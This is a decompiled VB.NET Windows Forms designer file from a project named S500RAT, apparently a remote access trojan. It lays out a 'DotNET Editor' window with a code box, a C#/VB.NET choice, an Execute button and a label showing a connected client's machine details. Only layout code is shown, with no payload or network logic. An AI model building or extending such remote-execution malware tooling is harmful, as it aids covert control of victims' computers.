Namespace S500RAT
	' Token: 0x02000018 RID: 24
	<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
	Public Partial Class FormDotNetEditor
		Inherits Global.System.Windows.Forms.Form

		' Token: 0x06000241 RID: 577 RVA: 0x000125BC File Offset: 0x000107BC
		<Global.System.Diagnostics.DebuggerNonUserCode()>
		Protected Overrides Sub Dispose(disposing As Boolean)
			Try
				Dim flag As Boolean = disposing AndAlso Me.components IsNot Nothing
				If flag Then
					Me.components.Dispose()
				End If
			Finally
				MyBase.Dispose(disposing)
			End Try
		End Sub

		' Token: 0x06000242 RID: 578 RVA: 0x0001260C File Offset: 0x0001080C
		<Global.System.Diagnostics.DebuggerStepThrough()>
		Private Sub InitializeComponent()
			Me.components = New Global.System.ComponentModel.Container()
			Dim dataGridViewCellStyle As Global.System.Windows.Forms.DataGridViewCellStyle = New Global.System.Windows.Forms.DataGridViewCellStyle()
			Dim dataGridViewCellStyle2 As Global.System.Windows.Forms.DataGridViewCellStyle = New Global.System.Windows.Forms.DataGridViewCellStyle()
			Dim dataGridViewCellStyle3 As Global.System.Windows.Forms.DataGridViewCellStyle = New Global.System.Windows.Forms.DataGridViewCellStyle()
			Dim componentResourceManager As Global.System.ComponentModel.ComponentResourceManager = New Global.System.ComponentModel.ComponentResourceManager(GetType(Global.S500RAT.FormDotNetEditor))
			Me.Timer1 = New Global.System.Windows.Forms.Timer(Me.components)
			Me.UiLabel1 = New Global.Sunny.UI.UILabel()
			Me.ClientInfo = New Global.System.Windows.Forms.Label()
			Me.ListReferences = New Global.Guna.UI2.WinForms.Guna2DataGridView()
			Me.Column3 = New Global.System.Windows.Forms.DataGridViewImageColumn()
			Me.Column4 = New Global.System.Windows.Forms.DataGridViewTextBoxColumn()
			Me.TextBox1 = New Global.Guna.UI2.WinForms.Guna2TextBox()
			Me.Execute = New Global.Guna.UI2.WinForms.Guna2GradientButton()
			Me.Guna2ResizeBox1 = New Global.Guna.UI2.WinForms.Guna2ResizeBox()
			Me.StateDotNET = New Global.System.Windows.Forms.LinkLabel()
			Me.Scharp = New Global.Sunny.UI.UIRadioButton()
			Me.VbNet = New Global.Sunny.UI.UIRadioButton()
			Me.T1 = New Global.FastColoredTextBoxNS.FastColoredTextBox()
			Me.im = New Global.System.Windows.Forms.ImageList(Me.components)
			Me.Guna2BorderlessForm1 = New Global.Guna.UI2.WinForms.Guna2BorderlessForm(Me.components)
			Me.Guna2DragControl1 = New Global.Guna.UI2.WinForms.Guna2DragControl(Me.components)
			Me.Guna2Elipse1 = New Global.Guna.UI2.WinForms.Guna2Elipse(Me.components)
			Me.Guna2Elipse2 = New Global.Guna.UI2.WinForms.Guna2Elipse(Me.components)
			Me.Mini = New Global.S500RAT.ValleyMini()
			Me.MAX = New Global.S500RAT.ValleyMax()
			Me.ExitForm = New Global.S500RAT.ValleyClose()
			CType(Me.ListReferences, Global.System.ComponentModel.ISupportInitialize).BeginInit()
			CType(Me.T1, Global.System.ComponentModel.ISupportInitialize).BeginInit()
			MyBase.SuspendLayout()
			Me.Timer1.Interval = 2000
			Me.UiLabel1.AutoSize = True
			Me.UiLabel1.BackColor = Global.System.Drawing.Color.Transparent
			Me.UiLabel1.Font = New Global.System.Drawing.Font("Microsoft YaHei", 9.75F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.UiLabel1.ForeColor = Global.System.Drawing.Color.White
			Me.UiLabel1.Location = New Global.System.Drawing.Point(21, 13)
			Me.UiLabel1.Name = "UiLabel1"
			Me.UiLabel1.Size = New Global.System.Drawing.Size(103, 19)
			Me.UiLabel1.Style = Global.Sunny.UI.UIStyle.Custom
			Me.UiLabel1.TabIndex = 329
			Me.UiLabel1.Text = "DotNET Editor"
			Me.UiLabel1.TextAlign = Global.System.Drawing.ContentAlignment.MiddleLeft
			Me.ClientInfo.AutoSize = True
			Me.ClientInfo.BackColor = Global.System.Drawing.Color.Transparent
			Me.ClientInfo.Font = New Global.System.Drawing.Font("Microsoft YaHei", 8.25F, Global.System.Drawing.FontStyle.Regular, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.ClientInfo.ForeColor = Global.System.Drawing.Color.FromArgb(141, 152, 172)
			Me.ClientInfo.Location = New Global.System.Drawing.Point(21, 37)
			Me.ClientInfo.Name = "ClientInfo"
			Me.ClientInfo.Size = New Global.System.Drawing.Size(181, 16)
			Me.ClientInfo.TabIndex = 330
			Me.ClientInfo.Text = "FC / Desktop_3424 / WiWs 10 pro"
			Me.ListReferences.AllowUserToAddRows = False
			Me.ListReferences.AllowUserToDeleteRows = False
			Me.ListReferences.AllowUserToResizeColumns = False
			Me.ListReferences.AllowUserToResizeRows = False
			dataGridViewCellStyle.BackColor = Global.System.Drawing.Color.FromArgb(209, 196, 233)
			Me.ListReferences.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle
			Me.ListReferences.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.ListReferences.AutoSizeColumnsMode = Global.System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells
			Me.ListReferences.BackgroundColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.ListReferences.BorderStyle = Global.System.Windows.Forms.BorderStyle.None
			Me.ListReferences.CellBorderStyle = Global.System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal
			Me.ListReferences.ColumnHeadersBorderStyle = Global.System.Windows.Forms.DataGridViewHeaderBorderStyle.None
			dataGridViewCellStyle2.Alignment = Global.System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft
			dataGridViewCellStyle2.BackColor = Global.System.Drawing.Color.FromArgb(103, 58, 183)
			dataGridViewCellStyle2.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			dataGridViewCellStyle2.ForeColor = Global.System.Drawing.Color.White
			dataGridViewCellStyle2.SelectionBackColor = Global.System.Drawing.SystemColors.Highlight
			dataGridViewCellStyle2.SelectionForeColor = Global.System.Drawing.SystemColors.HighlightText
			dataGridViewCellStyle2.WrapMode = Global.System.Windows.Forms.DataGridViewTriState.[True]
			Me.ListReferences.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2
			Me.ListReferences.ColumnHeadersHeightSizeMode = Global.System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing
			Me.ListReferences.Columns.AddRange(New Global.System.Windows.Forms.DataGridViewColumn() { Me.Column3, Me.Column4 })
			dataGridViewCellStyle3.Alignment = Global.System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft
			dataGridViewCellStyle3.BackColor = Global.System.Drawing.Color.FromArgb(224, 215, 240)
			dataGridViewCellStyle3.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			dataGridViewCellStyle3.ForeColor = Global.System.Drawing.SystemColors.ControlText
			dataGridViewCellStyle3.SelectionBackColor = Global.System.Drawing.Color.FromArgb(153, 123, 207)
			dataGridViewCellStyle3.SelectionForeColor = Global.System.Drawing.Color.Black
			dataGridViewCellStyle3.WrapMode = Global.System.Windows.Forms.DataGridViewTriState.[False]
			Me.ListReferences.DefaultCellStyle = dataGridViewCellStyle3
			Me.ListReferences.EnableHeadersVisualStyles = False
			Me.ListReferences.GridColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.ListReferences.Location = New Global.System.Drawing.Point(513, 80)
			Me.ListReferences.MultiSelect = False
			Me.ListReferences.Name = "ListReferences"
			Me.ListReferences.[ReadOnly] = True
			Me.ListReferences.RowHeadersVisible = False
			Me.ListReferences.RowHeadersWidth = 20
			Me.ListReferences.RowHeadersWidthSizeMode = Global.System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing
			Me.ListReferences.SelectionMode = Global.System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect
			Me.ListReferences.ShowCellErrors = False
			Me.ListReferences.ShowEditingIcon = False
			Me.ListReferences.ShowRowErrors = False
			Me.ListReferences.Size = New Global.System.Drawing.Size(189, 347)
			Me.ListReferences.TabIndex = 510
			Me.ListReferences.Theme = Global.Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.DeepPurple
			Me.ListReferences.ThemeStyle.AlternatingRowsStyle.BackColor = Global.System.Drawing.Color.FromArgb(209, 196, 233)
			Me.ListReferences.ThemeStyle.AlternatingRowsStyle.Font = Nothing
			Me.ListReferences.ThemeStyle.AlternatingRowsStyle.ForeColor = Global.System.Drawing.Color.Empty
			Me.ListReferences.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = Global.System.Drawing.Color.Empty
			Me.ListReferences.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = Global.System.Drawing.Color.Empty
			Me.ListReferences.ThemeStyle.BackColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.ListReferences.ThemeStyle.GridColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.ListReferences.ThemeStyle.HeaderStyle.BackColor = Global.System.Drawing.Color.FromArgb(103, 58, 183)
			Me.ListReferences.ThemeStyle.HeaderStyle.BorderStyle = Global.System.Windows.Forms.DataGridViewHeaderBorderStyle.None
			Me.ListReferences.ThemeStyle.HeaderStyle.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.ListReferences.ThemeStyle.HeaderStyle.ForeColor = Global.System.Drawing.Color.White
			Me.ListReferences.ThemeStyle.HeaderStyle.HeaightSizeMode = Global.System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing
			Me.ListReferences.ThemeStyle.HeaderStyle.Height = 23
			Me.ListReferences.ThemeStyle.[ReadOnly] = True
			Me.ListReferences.ThemeStyle.RowsStyle.BackColor = Global.System.Drawing.Color.FromArgb(224, 215, 240)
			Me.ListReferences.ThemeStyle.RowsStyle.BorderStyle = Global.System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal
			Me.ListReferences.ThemeStyle.RowsStyle.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.ListReferences.ThemeStyle.RowsStyle.ForeColor = Global.System.Drawing.SystemColors.ControlText
			Me.ListReferences.ThemeStyle.RowsStyle.Height = 22
			Me.ListReferences.ThemeStyle.RowsStyle.SelectionBackColor = Global.System.Drawing.Color.FromArgb(153, 123, 207)
			Me.ListReferences.ThemeStyle.RowsStyle.SelectionForeColor = Global.System.Drawing.Color.Black
			Me.Column3.AutoSizeMode = Global.System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells
			Me.Column3.HeaderText = "         "
			Me.Column3.ImageLayout = Global.System.Windows.Forms.DataGridViewImageCellLayout.Zoom
			Me.Column3.Name = "Column3"
			Me.Column3.[ReadOnly] = True
			Me.Column3.Width = 38
			Me.Column4.AutoSizeMode = Global.System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill
			Me.Column4.HeaderText = "References"
			Me.Column4.Name = "Column4"
			Me.Column4.[ReadOnly] = True
			Me.TextBox1.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.TextBox1.Animated = True
			Me.TextBox1.BackColor = Global.System.Drawing.Color.FromArgb(7, 11, 41)
			Me.TextBox1.BorderColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.TextBox1.BorderRadius = 7
			Me.TextBox1.BorderStyle = Global.System.Drawing.Drawing2D.DashStyle.Custom
			Me.TextBox1.Cursor = Global.System.Windows.Forms.Cursors.IBeam
			Me.TextBox1.DefaultText = ""
			Me.TextBox1.DisabledState.BorderColor = Global.System.Drawing.Color.FromArgb(208, 208, 208)
			Me.TextBox1.DisabledState.FillColor = Global.System.Drawing.Color.FromArgb(226, 226, 226)
			Me.TextBox1.DisabledState.ForeColor = Global.System.Drawing.Color.FromArgb(138, 138, 138)
			Me.TextBox1.DisabledState.Parent = Me.TextBox1
			Me.TextBox1.DisabledState.PlaceholderForeColor = Global.System.Drawing.Color.FromArgb(138, 138, 138)
			Me.TextBox1.FillColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.TextBox1.FocusedState.BorderColor = Global.System.Drawing.Color.FromArgb(94, 148, 255)
			Me.TextBox1.FocusedState.Parent = Me.TextBox1
			Me.TextBox1.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.TextBox1.ForeColor = Global.System.Drawing.Color.White
			Me.TextBox1.HoverState.BorderColor = Global.System.Drawing.Color.FromArgb(94, 148, 255)
			Me.TextBox1.HoverState.Parent = Me.TextBox1
			Me.TextBox1.IconLeft = CType(componentResourceManager.GetObject("TextBox1.IconLeft"), Global.System.Drawing.Image)
			Me.TextBox1.IconLeftCursor = Global.System.Windows.Forms.Cursors.Hand
			Me.TextBox1.IconRight = CType(componentResourceManager.GetObject("TextBox1.IconRight"), Global.System.Drawing.Image)
			Me.TextBox1.IconRightCursor = Global.System.Windows.Forms.Cursors.Hand
			Me.TextBox1.Location = New Global.System.Drawing.Point(513, 432)
			Me.TextBox1.Margin = New Global.System.Windows.Forms.Padding(3, 2, 3, 2)
			Me.TextBox1.Name = "TextBox1"
			Me.TextBox1.PasswordChar = vbNullChar
			Me.TextBox1.PlaceholderForeColor = Global.System.Drawing.Color.Gray
			Me.TextBox1.PlaceholderText = "Name"
			Me.TextBox1.SelectedText = ""
			Me.TextBox1.ShadowDecoration.Parent = Me.TextBox1
			Me.TextBox1.Size = New Global.System.Drawing.Size(189, 27)
			Me.TextBox1.TabIndex = 516
			Me.TextBox1.TextAlign = Global.System.Windows.Forms.HorizontalAlignment.Center
			Me.Execute.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.Execute.BackColor = Global.System.Drawing.Color.Transparent
			Me.Execute.BorderRadius = 8
			Me.Execute.CheckedState.Parent = Me.Execute
			Me.Execute.CustomImages.Parent = Me.Execute
			Me.Execute.Enabled = False
			Me.Execute.FillColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.Execute.FillColor2 = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.Execute.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.Execute.ForeColor = Global.System.Drawing.Color.White
			Me.Execute.HoverState.Parent = Me.Execute
			Me.Execute.Location = New Global.System.Drawing.Point(513, 464)
			Me.Execute.Name = "Execute"
			Me.Execute.ShadowDecoration.Parent = Me.Execute
			Me.Execute.Size = New Global.System.Drawing.Size(189, 30)
			Me.Execute.TabIndex = 515
			Me.Execute.Text = "Execute"
			Me.Guna2ResizeBox1.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.Guna2ResizeBox1.BackColor = Global.System.Drawing.Color.Transparent
			Me.Guna2ResizeBox1.FillColor = Global.System.Drawing.Color.Silver
			Me.Guna2ResizeBox1.ForeColor = Global.System.Drawing.Color.Empty
			Me.Guna2ResizeBox1.Location = New Global.System.Drawing.Point(690, 501)
			Me.Guna2ResizeBox1.Name = "Guna2ResizeBox1"
			Me.Guna2ResizeBox1.Size = New Global.System.Drawing.Size(17, 19)
			Me.Guna2ResizeBox1.TabIndex = 517
			Me.Guna2ResizeBox1.TargetControl = Me
			Me.Guna2ResizeBox1.UseTransparentBackground = True
			Me.StateDotNET.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Left)
			Me.StateDotNET.AutoSize = True
			Me.StateDotNET.LinkColor = Global.System.Drawing.Color.DimGray
			Me.StateDotNET.Location = New Global.System.Drawing.Point(12, 509)
			Me.StateDotNET.Name = "StateDotNET"
			Me.StateDotNET.Size = New Global.System.Drawing.Size(16, 13)
			Me.StateDotNET.TabIndex = 518
			Me.StateDotNET.TabStop = True
			Me.StateDotNET.Text = "..."
			Me.Scharp.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Left)
			Me.Scharp.BackColor = Global.System.Drawing.Color.Transparent
			Me.Scharp.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.Scharp.Font = New Global.System.Drawing.Font("Nirmala UI", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.Scharp.ForeColor = Global.System.Drawing.Color.FromArgb(143, 156, 176)
			Me.Scharp.Location = New Global.System.Drawing.Point(12, 477)
			Me.Scharp.MinimumSize = New Global.System.Drawing.Size(1, 1)
			Me.Scharp.Name = "Scharp"
			Me.Scharp.Padding = New Global.System.Windows.Forms.Padding(22, 0, 0, 0)
			Me.Scharp.RadioButtonColor = Global.System.Drawing.Color.Gray
			Me.Scharp.Size = New Global.System.Drawing.Size(87, 17)
			Me.Scharp.Style = Global.Sunny.UI.UIStyle.Custom
			Me.Scharp.TabIndex = 520
			Me.Scharp.Text = "C#"
			Me.VbNet.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Left)
			Me.VbNet.BackColor = Global.System.Drawing.Color.Transparent
			Me.VbNet.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.VbNet.Font = New Global.System.Drawing.Font("Nirmala UI", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.VbNet.ForeColor = Global.System.Drawing.Color.FromArgb(143, 156, 176)
			Me.VbNet.Location = New Global.System.Drawing.Point(114, 477)
			Me.VbNet.MinimumSize = New Global.System.Drawing.Size(1, 1)
			Me.VbNet.Name = "VbNet"
			Me.VbNet.Padding = New Global.System.Windows.Forms.Padding(22, 0, 0, 0)
			Me.VbNet.RadioButtonColor = Global.System.Drawing.Color.Gray
			Me.VbNet.Size = New Global.System.Drawing.Size(87, 17)
			Me.VbNet.Style = Global.Sunny.UI.UIStyle.Custom
			Me.VbNet.TabIndex = 519
			Me.VbNet.Text = "VB.Net"
			Me.T1.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Left Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.T1.AutoCompleteBracketsList = New Char() { "("c, ")"c, "{"c, "}"c, "["c, "]"c, """"c, """"c, "'"c, "'"c }
			Me.T1.AutoIndentCharsPatterns = vbLf & "^\s*[\w\.]+(\s\w+)?\s*(?<range>=)\s*(?<range>[^;=]+);" & vbLf & "^\s*(case|default)\s*[^:]*(?<range>:)\s*(?<range>[^;]+);" & vbLf
			Me.T1.AutoScrollMinSize = New Global.System.Drawing.Size(27, 14)
			Me.T1.BackBrush = Nothing
			Me.T1.BackColor = Global.System.Drawing.Color.FromArgb(30, 30, 30)
			Me.T1.BracketsHighlightStrategy = Global.FastColoredTextBoxNS.BracketsHighlightStrategy.Strategy2
			Me.T1.CaretColor = Global.System.Drawing.Color.White
			Me.T1.CharHeight = 14
			Me.T1.CharWidth = 8
			Me.T1.Cursor = Global.System.Windows.Forms.Cursors.IBeam
			Me.T1.DefaultMarkerSize = 8
			Me.T1.DisabledColor = Global.System.Drawing.Color.Empty
			Me.T1.Font = New Global.System.Drawing.Font("Courier New", 9.75F)
			Me.T1.ForeColor = Global.System.Drawing.Color.FromArgb(53, 175, 176)
			Me.T1.IndentBackColor = Global.System.Drawing.Color.FromArgb(30, 30, 30)
			Me.T1.IsReplaceMode = False
			Me.T1.Language = Global.FastColoredTextBoxNS.Language.CSharp
			Me.T1.LeftBracket = "("c
			Me.T1.LeftBracket2 = "{"c
			Me.T1.Location = New Global.System.Drawing.Point(12, 80)
			Me.T1.Name = "T1"
			Me.T1.Paddings = New Global.System.Windows.Forms.Padding(0)
			Me.T1.RightBracket = ")"c
			Me.T1.RightBracket2 = "}"c
			Me.T1.SelectionColor = Global.System.Drawing.Color.FromArgb(60, 224, 224, 224)
			Me.T1.ServiceColors = CType(componentResourceManager.GetObject("T1.ServiceColors"), Global.FastColoredTextBoxNS.ServiceColors)
			Me.T1.ServiceLinesColor = Global.System.Drawing.Color.FromArgb(30, 30, 30)
			Me.T1.Size = New Global.System.Drawing.Size(495, 379)
			Me.T1.TabIndex = 522
			Me.T1.TextAreaBorder = Global.FastColoredTextBoxNS.TextAreaBorderType.Shadow
			Me.T1.TextAreaBorderColor = Global.System.Drawing.Color.FromArgb(30, 30, 30)
			Me.T1.Zoom = 100
			Me.im.ImageStream = CType(componentResourceManager.GetObject("im.ImageStream"), Global.System.Windows.Forms.ImageListStreamer)
			Me.im.TransparentColor = Global.System.Drawing.Color.FromArgb(82, 43, 235)
			Me.im.Images.SetKeyName(0, "D.png")
			Me.Guna2BorderlessForm1.AnimateWindow = True
			Me.Guna2BorderlessForm1.BorderRadius = 40
			Me.Guna2BorderlessForm1.ContainerControl = Me
			Me.Guna2BorderlessForm1.DockIndicatorColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2BorderlessForm1.DragStartTransparencyValue = 0.6
			Me.Guna2BorderlessForm1.ShadowColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2BorderlessForm1.TransparentWhileDrag = True
			Me.Guna2DragControl1.ContainerControl = Me
			Me.Guna2DragControl1.DockForm = True
			Me.Guna2DragControl1.DockIndicatorColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2DragControl1.DragMode = Global.Guna.UI2.WinForms.Enums.DragMode.Control
			Me.Guna2DragControl1.DragStartTransparencyValue = 0.6
			Me.Guna2DragControl1.TargetControl = Me
			Me.Guna2DragControl1.TransparentWhileDrag = True
			Me.Guna2DragControl1.UseTransparentDrag = True
			Me.Guna2Elipse1.BorderRadius = 8
			Me.Guna2Elipse1.TargetControl = Me.ListReferences
			Me.Guna2Elipse2.BorderRadius = 8
			Me.Guna2Elipse2.TargetControl = Me.T1
			Me.Mini.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.Mini.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.Mini.Location = New Global.System.Drawing.Point(633, 12)
			Me.Mini.Name = "Mini"
			Me.Mini.Size = New Global.System.Drawing.Size(20, 20)
			Me.Mini.TabIndex = 589
			Me.Mini.Text = "ValleyMini1"
			Me.MAX.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.MAX.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.MAX.Location = New Global.System.Drawing.Point(659, 12)
			Me.MAX.Name = "MAX"
			Me.MAX.Size = New Global.System.Drawing.Size(20, 20)
			Me.MAX.TabIndex = 588
			Me.MAX.Text = "ValleyMax1"
			Me.ExitForm.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.ExitForm.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.ExitForm.Location = New Global.System.Drawing.Point(685, 12)
			Me.ExitForm.Name = "ExitForm"
			Me.ExitForm.Size = New Global.System.Drawing.Size(20, 20)
			Me.ExitForm.TabIndex = 587
			Me.ExitForm.Text = "ValleyClose1"
			MyBase.AutoScaleDimensions = New Global.System.Drawing.SizeF(96F, 96F)
			MyBase.AutoScaleMode = Global.System.Windows.Forms.AutoScaleMode.Dpi
			Me.BackColor = Global.System.Drawing.Color.FromArgb(7, 11, 41)
			MyBase.ClientSize = New Global.System.Drawing.Size(717, 530)
			MyBase.Controls.Add(Me.Mini)
			MyBase.Controls.Add(Me.MAX)
			MyBase.Controls.Add(Me.ExitForm)
			MyBase.Controls.Add(Me.T1)
			MyBase.Controls.Add(Me.Scharp)
			MyBase.Controls.Add(Me.VbNet)
			MyBase.Controls.Add(Me.StateDotNET)
			MyBase.Controls.Add(Me.Guna2ResizeBox1)
			MyBase.Controls.Add(Me.TextBox1)
			MyBase.Controls.Add(Me.Execute)
			MyBase.Controls.Add(Me.ListReferences)
			MyBase.Controls.Add(Me.UiLabel1)
			MyBase.Controls.Add(Me.ClientInfo)
			Me.DoubleBuffered = True
			MyBase.FormBorderStyle = Global.System.Windows.Forms.FormBorderStyle.None
			MyBase.Icon = CType(componentResourceManager.GetObject("$this.Icon"), Global.System.Drawing.Icon)
			MyBase.Name = "FormDotNetEditor"
			Me.Text = "FormDotNetEditor"
			MyBase.TopMost = True
			CType(Me.ListReferences, Global.System.ComponentModel.ISupportInitialize).EndInit()
			CType(Me.T1, Global.System.ComponentModel.ISupportInitialize).EndInit()
			MyBase.ResumeLayout(False)
			MyBase.PerformLayout()
		End Sub

		' Token: 0x04000108 RID: 264
		Private components As Global.System.ComponentModel.IContainer
	End Class
End Namespace
